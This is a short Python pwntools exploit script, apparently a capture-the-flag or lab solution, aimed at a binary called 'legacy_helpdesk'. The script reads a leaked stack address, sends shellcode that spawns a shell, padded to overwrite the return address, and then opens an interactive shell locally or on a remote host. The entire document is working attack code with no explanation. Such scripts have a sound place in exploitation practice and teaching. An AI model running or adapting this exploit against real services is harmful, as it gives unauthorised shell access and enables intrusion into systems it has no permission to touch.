#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./build/legacy_helpdesk", checksec=False)
context.arch = "amd64"

HOST = args.get("HOST", "127.0.0.1")
PORT = int(args.get("PORT", 1337))


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def main():
    io = start()

    line = io.recvline_contains(b"Clipboard address")
    addr = int(line.strip().split()[-1], 16)
    log.info(f"stack buffer @ 0x{addr:x}")

    sc = asm(shellcraft.sh())
    payload = sc.ljust(104, b"A") + p64(addr)

    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
